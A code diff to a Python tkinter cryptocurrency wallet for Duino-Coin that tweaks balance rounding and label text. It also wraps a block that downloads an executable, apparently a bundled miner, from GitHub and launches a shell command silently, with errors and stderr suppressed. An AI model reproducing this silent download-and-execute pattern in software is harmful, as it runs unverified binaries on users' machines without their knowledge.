@@ -446,27 +446,27 @@ def getBalance():
         getBalance()
         
     if "." in str(balance): # Check wheter we received proper data
-        balance = round(float(balance), 8) # Format balances
+        balance = round(float(balance), 12) # Format balances
         balanceusd = round(float(balance) * float(ducousd), 8)
         ducousd = round(float(ducousd), 8)
         
         if balance == oldbalance: # Don't play animation if no change in balance
             pass
         else: # Animation
-            label = tkinter.Label(wallet, text = "Your balance: "+str(oldbalance)+" DUCO      ", bg = str(colorA), fg = str(colorB), font=("Arial", 12)).place(relx=.1, rely=.15)
+            label = tkinter.Label(wallet, text = "Balance: "+str(oldbalance)+" DUCO      ", bg = str(colorA), fg = str(colorB), font=("Arial", 12)).place(relx=.1, rely=.15)
             label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg = str(colorB), font=("Arial", 10)).place(relx=.1, rely=.27)
             time.sleep(0.05)
-            label = tkinter.Label(wallet, text = "Your balance: "+str(oldbalance)+" DUCO      ", bg = str(colorA), fg="gray", font=("Arial", 12)).place(relx=.1, rely=.15)
+            label = tkinter.Label(wallet, text = "Balance: "+str(oldbalance)+" DUCO      ", bg = str(colorA), fg="gray", font=("Arial", 12)).place(relx=.1, rely=.15)
             label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg="gray", font=("Arial", 10)).place(relx=.1, rely=.27)
             time.sleep(0.05)
-            label = tkinter.Label(wallet, text = "Your balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg = str(colorA), font=("Arial", 12)).place(relx=.1, rely=.15)
+            label = tkinter.Label(wallet, text = "Balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg = str(colorA), font=("Arial", 12)).place(relx=.1, rely=.15)
             label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg = str(colorA), font=("Arial", 10)).place(relx=.1, rely=.27)
             wallet.title("Duino-Coin Wallet (Beta 3) - "+str(round(float(balance), 2))+" DUCO")
             time.sleep(0.05)
-            label = tkinter.Label(wallet, text = "Your balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg="gray", font=("Arial", 12)).place(relx=.1, rely=.15)
+            label = tkinter.Label(wallet, text = "Balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg="gray", font=("Arial", 12)).place(relx=.1, rely=.15)
             label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg="gray", font=("Arial", 10)).place(relx=.1, rely=.27)
             time.sleep(0.05)
-            label = tkinter.Label(wallet, text = "Your balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg = str(colorB), font=("Arial", 12)).place(relx=.1, rely=.15)
+            label = tkinter.Label(wallet, text = "Balance: "+str(balance)+" DUCO      ", bg = str(colorA), fg = str(colorB), font=("Arial", 12)).place(relx=.1, rely=.15)
             label = tkinter.Label(wallet, text = "Estimated balance in USD: "+str(balanceusd)+" $      ", bg = str(colorA), fg = str(colorB), font=("Arial", 10)).place(relx=.1, rely=.27)
             time.sleep(0.05)
     else:
@@ -565,15 +565,18 @@ if not Path("Wallet_b3_resources/Wallet_background_community.gif").is_file(): # 
 else:
     debug += "Community background image already downloaded\n"
 
-if not Path("Wallet_b3_resources/Wallet_executable.exe").is_file(): # Initial miner executable section
-  url = 'https://github.com/revoxhere/duino-coin/blob/useful-tools/PoT_auto.exe?raw=true'
-  r = requests.get(url)
-  with open('Wallet_b3_resources/Wallet_executable.exe', 'wb') as f:
-    f.write(r.content)
-try: # Network support           
-  process = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL) # Open command
+try:
+    if not Path("Wallet_b3_resources/Wallet_executable.exe").is_file(): # Initial miner executable section
+      url = 'https://github.com/revoxhere/duino-coin/blob/useful-tools/PoT_auto.exe?raw=true'
+      r = requests.get(url)
+      with open('Wallet_b3_resources/Wallet_executable.exe', 'wb') as f:
+        f.write(r.content)
+    try: # Network support           
+      process = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL) # Open command
+    except:
+      pass
 except:
-  pass
+    pass
 
 label = tkinter.Label(loadingScr, text = "Authenticating user..." + str(" ")*20, bg = str(colorA), fg = str(colorC), font=("Arial", 8)).place(relx = 0.01, rely = 0.8)  
 loadingScr.update()
